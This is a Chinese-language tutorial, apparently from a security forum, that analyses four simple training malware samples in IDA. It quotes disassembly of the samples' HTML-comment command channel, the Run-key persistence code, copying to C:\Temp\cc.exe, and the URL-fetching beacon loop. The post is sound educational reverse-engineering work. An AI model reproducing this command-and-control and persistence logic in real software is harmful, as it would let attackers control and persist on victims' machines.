0x00 前言
-------

本文利用IDA分析4个简单的恶意程序，旨在基本掌握这4个恶意程序的C语言逻辑结构，同时这4个程序功能逐渐递增，循序渐进。笔者也是初学者，有些不足之处在所难免，请师傅们斧正

0x01
----

详细分析
----

首先静态分析该exe文件，看下导入函数，其中一个调用了 `WININET.dll`中的 `InternetGetConnectedState` 函数，这个跟其他调用 `kernel32.dll` 中的函数相比，显得有些特殊。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-2f48b1085fc9831519fe8075c8936be4d23850f5.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-2f48b1085fc9831519fe8075c8936be4d23850f5.png)

查阅文档可知，这是一个 判断本地网络连接状态的函数，连接成功返回1，连接失败返回0

[互联网连接状态功能 （wininet.h） - win32 应用程序|微软文档 (microsoft.com)](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetgetconnectedstate)

```c++
BOOL InternetGetConnectedState(
  [out] LPDWORD lpdwFlags,
  [in]  DWORD   dwReserved
);
```

找到了main 函数，就从这里开始分析

`main`函数位于`401040`，调用了`401000`处的函数

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-fdb02ce845d549afd058aaa34286a072f4514217.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-fdb02ce845d549afd058aaa34286a072f4514217.png)

跳过去看看

上面一大堆没用的是编译器生成的，不要陷入其中

看到该区段的权限是 可读/可执行，并且调用了 `InternetGetConnectedState` 函数

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d2d23fc28ef32e551f28495d93d901561cd1970a.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d2d23fc28ef32e551f28495d93d901561cd1970a.png)

不看流程图的话大概也可以看出这是一个 if 语句的汇编代码，`cmp [ebp+var_4] ，0` ，根据结果跳转到不同的分支

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-daebd9baa7c36c3f0c52dd062b8cdf605d49549b.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-daebd9baa7c36c3f0c52dd062b8cdf605d49549b.png)

在 `View->Graphs->Flow chart`可以查看流程图，相比较于空格的 流程图，更简洁明了

这里使用cmp指令对保存了返回结果的eax寄存器与0比较，然后使用 jz 指令控制执行流。上面我们提到，当 建立网络连接时，`InternetGetConnectedState`函数返回1，否则返回0. 如果结果是1，0标志位（ZF）会被清除，jz跳转到1所在的`false`分支，否则跳转到`true`分支

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d04a034324fabcde3c1bf865f55488e1dd5a9a21.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d04a034324fabcde3c1bf865f55488e1dd5a9a21.png)

下面分析这个位于 `40105f`处的子过程

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-7342ec191afdad4c6600d87730a74bda4f77700c.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-7342ec191afdad4c6600d87730a74bda4f77700c.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-39a674e708c3d07a474781b5e8d96635b62d2d04.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-39a674e708c3d07a474781b5e8d96635b62d2d04.png)

其实这里是`printf` 函数，但是我们并没有看到一些printf函数的特征，这就需要去找一些其他的特征来证明这里是`printf`函数

在调用这个函数之前，都向栈中`push`了 一串 格式化字符串，并且结尾是`\n` 换行符，因此可以推出这里调用的函数就是 `printf`

上面都是是根据静态分析得出的结论，真正的结果还是要实践检验一下，确实与我们分析的结果一样

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-09525868c1589dd8eb418737cfca95078bd71e56.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-09525868c1589dd8eb418737cfca95078bd71e56.png)

### 总结

这个恶意代码的主要功能就是检查是否存在 `Internet`连接，存在输出1，否则输出0。

0x02
----

#### 详细分析

首先还是看到这个pe文件的导入表

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d904fefd14061930ed5417ee397f5fdb700203f7.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d904fefd14061930ed5417ee397f5fdb700203f7.png)

```php
InternetOpenUrl: 通过FTP或 HTTP URL打开一个原始资源。如果连接成功建立，则返回一个有效的句柄，如果连接失败，则返回 NULL
internetclosehandle ：关闭句柄，成功关闭返回 true，否则返回false
InternetReadFile： 从InternetOpenA打开的句柄读取数据
InternetGetConnectedState： 验证网络连接状态
InternetOpenA: 设置用户代理，即HTTP的 user-agent 头
```

看到其中的一些字符串，在结合上面调用的 api函数，不难猜出，要访问的url地址

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-7a760dcfee3dfbeb34ef804b0d9900318aadb704.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-7a760dcfee3dfbeb34ef804b0d9900318aadb704.png)

接着来分析 main 函数

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-24c042a9580a5bca380cb9a4a91d2b6a76f70ded.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-24c042a9580a5bca380cb9a4a91d2b6a76f70ded.png)

`401000` 处这里就不说了，和前面一样

但是401000 这里还调用的 `40117f`，跳过去看看

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-babd95f49453ec00047b1f3c11f4bd834949eeaa.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-babd95f49453ec00047b1f3c11f4bd834949eeaa.png)

这个结构很像前面分析的 `printf`函数，那我们再往前看一看。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a5ce8215e40b0068cf56842bf047e716db89fdc6.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a5ce8215e40b0068cf56842bf047e716db89fdc6.png)

果然，在push入栈中也有一串格式化的字符串，基本可以确定`40117f` 处的函数是 `printf`函数

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-7c757dc3575d88c5173096bd24b1e8df0e85c954.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-7c757dc3575d88c5173096bd24b1e8df0e85c954.png)

同时，main 函数中还调用了另一个`401040`函数

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-0a402262b3cd60a48f9b588ef3a12cd9b85a09ab.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-0a402262b3cd60a48f9b588ef3a12cd9b85a09ab.png)

这里包含了所有 前面发现的 WinINet api的调用。首先调用了`InternetOpen` ，以初始化对`WinINet`的使用。在这之前，将 `Internet Explorer 7.5` `push` 入栈，当作 User-Agent 头部，接着调用 `InternetOpenUrl` ，打开该静态网页

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-4165432a8f46181055c7a2cb41aa3a8427c9732c.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-4165432a8f46181055c7a2cb41aa3a8427c9732c.png)

可以看到，调用完 `InternetOpenUrl`后，返回值被赋值给了hFIle，并接着与0比较，如果等于0会返回，否则跳转到`40109D`，hFile被传递给`InternetReadFIle`函数。

`InternetReadFile` 函数用于从`InternetOpenUrlA`打开的网页中读取内容。在调用完后，会和0比较，如果为0，该函数会关闭句柄并终止，否则会跳转到 `4010E5`，逐步比较 buffer 数组 与每个字符的值，

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-42a392f6dc9c7f67e34bc68a93b4b264ebd473c0.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-42a392f6dc9c7f67e34bc68a93b4b264ebd473c0.png)

这里有注释会好很多&lt;!— ,否则的话，最开始的 3c 对应的ASCII码是 &lt;，也可以一一对应 出 &lt;!— ，这是html中注释的开始部分。

这时候就可以猜测存在 http 交互

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d0f3414167672805ee15d45d52f283bfbf2d958b.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d0f3414167672805ee15d45d52f283bfbf2d958b.png)

因此大概就可以确定，如果 buffer 的前 4个字节与 &lt;!— 匹配成功的话，第5个字符就会被移到 AL 中并返回。

接着分析 main 函数，

看到在 401173 处 ，调用了 sleep 函数，传递的参数为 0xEA60h，即60000ms，1min

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6098a31fd806f67160b5cd96b439c5cee82aa63e.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6098a31fd806f67160b5cd96b439c5cee82aa63e.png)

### 总结

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-0d092d92538f08e6ac8a2cede242ee45c1f91b63.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-0d092d92538f08e6ac8a2cede242ee45c1f91b63.png)

该恶意样本检查是否有可用的网络连接，如果不存在，终止运行，否则返回 true，使用代理去下载其中包含的一个网址中的内容，这个网址包含注释，并且将printf解析后的字符串 “success： Parsed command is %c”到屏幕，输出成功的话，会sleep一分钟。这种方式是通过注释来隐藏指令，使得恶意代码看起来像是访问正常网页。

0x03
----

#### 详细分析

还是先看看导入表，一些旧东西  
[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6241ce0b82ef6dae51551735dc3cb20c9cb0b9cf.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6241ce0b82ef6dae51551735dc3cb20c9cb0b9cf.png)

修改注册表的api函数， RegSet ValueExA和 RegOpenKeyExA 一起用于向注册表中插入信息，在设置应用程序启动项/开机自启时，通常会使用这两个函数

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e6f4e4df8b83b6c5d84fca7fbc8fa204e169e161.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e6f4e4df8b83b6c5d84fca7fbc8fa204e169e161.png)

字符串也是发现了一些很有意思的，在临时目录会生成 cc.exe 文件，还会去修改注册表的自启动项目录

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6d027d01c8b0d4ecbb24ddde34023adc14cd87a1.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6d027d01c8b0d4ecbb24ddde34023adc14cd87a1.png)

下面接着看main 函数，与上一个恶意样本很像，接下来就找不同

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-760bb42c482364d955513e7b0dc124ab11f16764.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-760bb42c482364d955513e7b0dc124ab11f16764.png)

401000 处的检查网络连接和 401040处的下载网页与 上一篇基本相同，而不同的是这里多了对401030的调用

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-803e26d87eb1ce121c7233932c13a23561e0b79a.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-803e26d87eb1ce121c7233932c13a23561e0b79a.png)

仔细分析 401130处的函数

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-053b918ebbfb122a0a27359e49dd476c026df675.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-053b918ebbfb122a0a27359e49dd476c026df675.png)

根据注释可以看出是 switch 分支语句

看下它传入的参数，在调用前，传入了 argv 和 var\_8 push入栈作为参数，这里的 argv就是argv\[0\]，就是这个程序的字符串引用，  
[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ca12ee0ab218462c35a17c85a330bf58fb895d88.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ca12ee0ab218462c35a17c85a330bf58fb895d88.png)

追踪 var\_8 参数，发现在 40122D 处被设置为AL。此时 eax 存放的是上一个调用函数 401040的返回值，即html注释中的解析字符

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e6e1357abc4899d8c7ff13f04203d1292ade11c7.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e6e1357abc4899d8c7ff13f04203d1292ade11c7.png)

再来分析401130

arg\_0 是IDA 自动生成的标签，用于标记调用函数前最后一个被push入栈的参数，所以这里的 arg\_0 是解析得到的html指令字符，并赋值给 var\_8，接着加载到ecx中执行，减去61h，因此，如果传入的arg\_0 =a，执行sub指令后，ecx归0

接下来 cmp ecx 和4，检查 arg\_0 是否是 a-e 中的某个字符，如果不是，ja 跳转到 401153，如果是的话，这个指令字符放入edx中，被用作跳转表的索引，看到下面 edx\*4，因为这是switch结构，跳转表是一组指向不同函数的地址表，每个地址的大小占4个字节，而下面也正如我们所料，跳转表有5条记录

```assembly
.text:00401130                 push    ebp
.text:00401131                 mov     ebp, esp
.text:00401133                 sub     esp, 8
.text:00401136                 movsx   eax, [ebp+arg_0]
.text:0040113A                 mov     [ebp+var_8], eax
.text:0040113D                 mov     ecx, [ebp+var_8]
.text:00401140                 sub     ecx, 61h ; 'a'  ; switch 5 cases
.text:00401143                 mov     [ebp+var_8], ecx
.text:00401146                 cmp     [ebp+var_8], 4
.text:0040114A                 ja      def_401153      ; jumptable 00401153 default case
.text:00401150                 mov     edx, [ebp+var_8]
.text:00401153                 jmp     ds:jpt_401153[edx*4] ; switch jump
.text:0040115A ; ---------------------------------------------------------------------------
.text:0040115A
.text:0040115A loc_40115A:                             ; CODE XREF: sub_401130+23↑j
.text:0040115A                                         ; DATA XREF: .text:jpt_401153↓o
.text:0040115A                 push    0               ; jumptable 00401153 case 97
.text:0040115C                 push    offset PathName ; "C:\\Temp"
.text:00401161                 call    ds:CreateDirectoryA
.text:00401167                 jmp     loc_4011EE
.text:0040116C ; ---------------------------------------------------------------------------
.text:0040116C
.text:0040116C loc_40116C:                             ; CODE XREF: sub_401130+23↑j
.text:0040116C                                         ; DATA XREF: .text:jpt_401153↓o
.text:0040116C                 push    1               ; jumptable 00401153 case 98
.text:0040116E                 push    offset Data     ; "C:\\Temp\\cc.exe"
.text:00401173                 mov     eax, [ebp+lpExistingFileName]
.text:00401176                 push    eax             ; lpExistingFileName
.text:00401177                 call    ds:CopyFileA
.text:0040117D                 jmp     short loc_4011EE
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-1ec55b1cf8f45ed216d5cd07ae125fb5dfb34c82.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-1ec55b1cf8f45ed216d5cd07ae125fb5dfb34c82.png)

分别来看这5条语句调用函数的地址

```assembly
.text:0040115A loc_40115A:                             ; CODE XREF: sub_401130+23↑j
.text:0040115A                                         ; DATA XREF: .text:jpt_401153↓o
.text:0040115A                 push    0               ; jumptable 00401153 case 97
.text:0040115C                 push    offset PathName ; "C:\\Temp"
.text:00401161                 call    ds:CreateDirectoryA
.text:00401167                 jmp     loc_4011EE
.text:0040116C ; ---------------------------------------------------------------------------
.text:0040116C
.text:0040116C loc_40116C:                             ; CODE XREF: sub_401130+23↑j
.text:0040116C                                         ; DATA XREF: .text:jpt_401153↓o
.text:0040116C                 push    1               ; jumptable 00401153 case 98
.text:0040116E                 push    offset Data     ; "C:\\Temp\\cc.exe"
.text:00401173                 mov     eax, [ebp+lpExistingFileName]
.text:00401176                 push    eax             ; lpExistingFileName
.text:00401177                 call    ds:CopyFileA
.text:0040117D                 jmp     short loc_4011EE
.text:0040117F ; ---------------------------------------------------------------------------
.text:0040117F
.text:0040117F loc_40117F:                             ; CODE XREF: sub_401130+23↑j
.text:0040117F                                         ; DATA XREF: .text:jpt_401153↓o
.text:0040117F                 push    offset Data     ; jumptable 00401153 case 99
.text:00401184                 call    ds:DeleteFileA
.text:0040118A                 jmp     short loc_4011EE
.text:0040118C ; ---------------------------------------------------------------------------
.text:0040118C
.text:0040118C loc_40118C:                             ; CODE XREF: sub_401130+23↑j
.text:0040118C                                         ; DATA XREF: .text:jpt_401153↓o
.text:0040118C                 lea     ecx, [ebp+phkResult] ; jumptable 00401153 case 100
.text:0040118F                 push    ecx             ; phkResult
.text:00401190                 push    0F003Fh         ; samDesired
.text:00401195                 push    0               ; ulOptions
.text:00401197                 push    offset SubKey   ; "Software\\Microsoft\\Windows\\CurrentVe"...
.text:0040119C                 push    80000002h       ; hKey
.text:004011A1                 call    ds:RegOpenKeyExA
.text:004011A7                 push    0Fh             ; cbData
.text:004011A9                 push    offset Data     ; "C:\\Temp\\cc.exe"
.text:004011AE                 push    1               ; dwType
.text:004011B0                 push    0               ; Reserved
.text:004011B2                 push    offset ValueName ; "Malware"
.text:004011B7                 mov     edx, [ebp+phkResult]
.text:004011BA                 push    edx             ; hKey
.text:004011BB                 call    ds:RegSetValueExA
.text:004011C1                 test    eax, eax
.text:004011C3                 jz      short loc_4011D2
.text:004011C5                 push    offset aError31CouldNo ; "Error 3.1: Could not set Registry value"...
.text:004011CA                 call    sub_401271
.text:004011CF                 add     esp, 4
.text:004011D2
.text:004011D2 loc_4011D2:                             ; CODE XREF: sub_401130+93↑j
.text:004011D2                 jmp     short loc_4011EE
.text:004011D4 ; ---------------------------------------------------------------------------
.text:004011D4
.text:004011D4 loc_4011D4:                             ; CODE XREF: sub_401130+23↑j
.text:004011D4                                         ; DATA XREF: .text:jpt_401153↓o
.text:004011D4                 push    186A0h          ; jumptable 00401153 case 101
.text:004011D9                 call    ds:Sleep
.text:004011DF                 jmp     short loc_4011EE
```

```php
a：调用createdirectory函数，参数是 C:\\Temp，如果该目录不存在，则创建该目录
b：调用copy file函数，两个参数分别是源文件（argv[0]即目标程序）和目的文件（C:\\Temp\cc.exe）
c：调用deletefile函数，当 C:\\Temp\cc.exe 文件存在时删除它
d：调用 RegSet ValueExA和 RegOpenKeyExA 在注册表中添加开机自启，即将Software\Microsoft Windows \CurrentVersion\Run\Malware 的值添加为C:\\Temp\cc.exe,这样目标机器每次开机时都会启动该恶意程序 
e：调用sleep函数，参数100s
```

### 总结

该程序的主要功能也了然于胸了，首先 if 判断是否联网，不联网程序终止。联网的话程序会去下载一个网页，其中包含了html的注释头部，并解析出第一个字符，用来校验switch的参数，决定执行哪条语句（创建目录/拷贝文件/删除文件/修改注册表/sleep）

0x04
----

#### 详细分析

首先还是先看下导入表，和前面一样，并没有多余的改变。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a12bf9296a0d1993709e9b3159707d736f4c2e7f.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a12bf9296a0d1993709e9b3159707d736f4c2e7f.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-f74de78d50e46b687dcdc4825e8071dc7234d964.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-f74de78d50e46b687dcdc4825e8071dc7234d964.png)

字符串的唯一变化就是多了 Internet Explorer 7.5 ，看来是多了个 user-agent 代理

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-68b5f931e1def94afabd60c197db8588d13362be.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-68b5f931e1def94afabd60c197db8588d13362be.png)

相同的这些就不说了，来看看不同点有哪些

来到main函数这里，也是很多相同的函数，401000（判断Internet是否连接），401040（解析HTML），4012b5（printf函数），401150（switch语句）

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ea7e3c57db85741a2cd57697cf6578d7e1b8da06.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ea7e3c57db85741a2cd57697cf6578d7e1b8da06.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-658e71c4bf8ff469eb99a191ce404030b0f00a88.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-658e71c4bf8ff469eb99a191ce404030b0f00a88.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e108106ef6ebe582d41c10d53d2b8ea3017dfab6.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e108106ef6ebe582d41c10d53d2b8ea3017dfab6.png)

而当我们看整个函数视图的时候，发现了一个向上的箭头，很明显出现了循环

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-bbd94dadaf7a59ed35edb764940bac583dad38d5.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-bbd94dadaf7a59ed35edb764940bac583dad38d5.png)

那就来分析下这段循环结构

```assembly
00401248 ; ---------------------------------------------------------------------------
.text:00401248
.text:00401248 loc_401248:                             ; CODE XREF: _main+12↑j
.text:00401248                 mov     [ebp+var_C], 0
.text:0040124F                 jmp     short loc_40125A
.text:00401251 ; ---------------------------------------------------------------------------
.text:00401251
.text:00401251 loc_401251:                             ; CODE XREF: _main+7D↓j
.text:00401251                 mov     eax, [ebp+var_C]
.text:00401254                 add     eax, 1
.text:00401257                 mov     [ebp+var_C], eax
.text:0040125A
.text:0040125A loc_40125A:                             ; CODE XREF: _main+1F↑j
.text:0040125A                 cmp     [ebp+var_C], 5A0h
.text:00401261                 jge     short loc_4012AF
.text:00401263                 mov     ecx, [ebp+var_C]
.text:00401266                 push    ecx
.text:00401267                 call    sub_401040
.text:0040126C                 add     esp, 4
.text:0040126F                 mov     [ebp+var_8], al
.text:00401272                 movsx   edx, [ebp+var_8]
.text:00401276                 test    edx, edx
.text:00401278                 jnz     short loc_40127E
.text:0040127A                 xor     eax, eax
.text:0040127C                 jmp     short loc_4012B1
.text:0040127E ; ---------------------------------------------------------------------------
.text:0040127E
.text:0040127E loc_40127E:                             ; CODE XREF: _main+48↑j
.text:0040127E                 movsx   eax, [ebp+var_8]
.text:00401282                 push    eax
.text:00401283                 push    offset aSuccessParsedC ; "Success: Parsed command is %c\n"
.text:00401288                 call    sub_4012B5
.text:0040128D                 add     esp, 8
.text:00401290                 mov     ecx, [ebp+argv]
.text:00401293                 mov     edx, [ecx]
.text:00401295                 push    edx             ; lpExistingFileName
.text:00401296                 mov     al, [ebp+var_8]
.text:00401299                 push    eax             ; char
.text:0040129A                 call    sub_401150
.text:0040129F                 add     esp, 8
.text:004012A2                 push    0EA60h          ; dwMilliseconds
.text:004012A7                 call    ds:Sleep
.text:004012AD                 jmp     short loc_401251
```

很明显，var\_c 是用来循环计数的，在 4012AD 处 jmp 401251，返回递增，如果大于5A0h(1440d) 就在401261处跳出循环到 4012AF，循环结束.否则程序接着运行，在401263处开始。将ecx（var\_c） push入栈，接着调用401040（解析html）函数，然后慢慢执行，在4012A7 处调用sleep函数，参数是 EA60h（60000d），即1分钟，所以这个程序会sleep 1440 分钟（24小时）

在上一个程序中，401040 处并没有参数，而这里传入了 arg\_0 作为参数，并且是唯一的参数，而在调用 401040 前，push进了ecx，即var\_c，所以这里的arg\_0 就是var\_c（计数器），push arg\_0入栈后，接着push了 Internet Explorer 7.50/pma%d 字符串，和 szAgent的地址。然后调用\_sprintf 函数，用来将格式化的数据写入字符串，并存储在szAgent 中。然后在40106a调用 INternetOpen 函数，传入的参数是 szAgent，也就是说，每次var\_C 计数器增加后， user-agent长度也会随之改变。这里就可以用来监测该程序运行了多长时间。

```assembly
text:00401040                 push    ebp
.text:00401041                 mov     ebp, esp
.text:00401043                 sub     esp, 230h
.text:00401049                 mov     eax, [ebp+arg_0]
.text:0040104C                 push    eax
.text:0040104D                 push    offset Format   ; "Internet Explorer 7.50/pma%d"
.text:00401052                 lea     ecx, [ebp+szAgent]
.text:00401055                 push    ecx             ; Buffer
.text:00401056                 call    _sprintf
.text:0040105B                 add     esp, 0Ch
.text:0040105E                 push    0               ; dwFlags
.text:00401060                 push    0               ; lpszProxyBypass
.text:00401062                 push    0               ; lpszProxy
.text:00401064                 push    0               ; dwAccessType
.text:00401066                 lea     edx, [ebp+szAgent]
.text:00401069                 push    edx             ; lpszAgent
.text:0040106A                 call    ds:InternetOpenA
.text:00401070                 mov     [ebp+hInternet], eax
.text:00401073                 push    0               ; dwContext
.text:00401075                 push    0               ; dwFlags
.text:00401077                 push    0               ; dwHeadersLength
.text:00401079                 push    0               ; lpszHeaders
.text:0040107B                 push    offset szUrl    ; "http://www.practicalmalwareanalysis.com"...
.text:00401080                 mov     eax, [ebp+hInternet]
.text:00401083                 push    eax             ; hInternet
.text:00401084                 call    ds:InternetOpenUrlA
.text:0040108A                 mov     [ebp+hFile], eax
.text:0040108D                 cmp     [ebp+hFile], 0
.text:00401091                 jnz     short loc_4010B1
.text:00401093                 push    offset aError21FailToO ; "Error 2.1: Fail to OpenUrl\n"
.text:00401098                 call    sub_4012B5
.text:0040109D                 add     esp, 4
.text:004010A0                 mov     ecx, [ebp+hInternet]
.text:004010A3                 push    ecx             ; hInternet
.text:004010A4                 call    ds:InternetCloseHandle
.text:004010AA                 xor     al, al
.text:004010AC                 jmp     loc_401140
```

### 总结

首先，程序会使用if结构检查是否建立连接。如果无，程序终止运行。否则，程序使用  
一个上面提到的的User-Agent 来下载一个html， 这个User-Agent包含了一个循环结构的计数器，用于向attacker显示程序已  
经运行了多长时间。下载的网页中包含了以&lt;!--开头的html注释代码，这段注释代码中  
接下来的第一个字符被用于一个switch语句，以决定接下来在本地系统的行为。包括删除文件、创建个目录、 设置一个注册表run键、复制文件、休眠100秒等。最终该程序会运行24小时后终止。

总结
--

通过简单的反汇编看简单恶意文件的C语言结构就先到这里，思路我上面都有提到，更复杂的我也正在慢慢学习，欢迎一起交流学习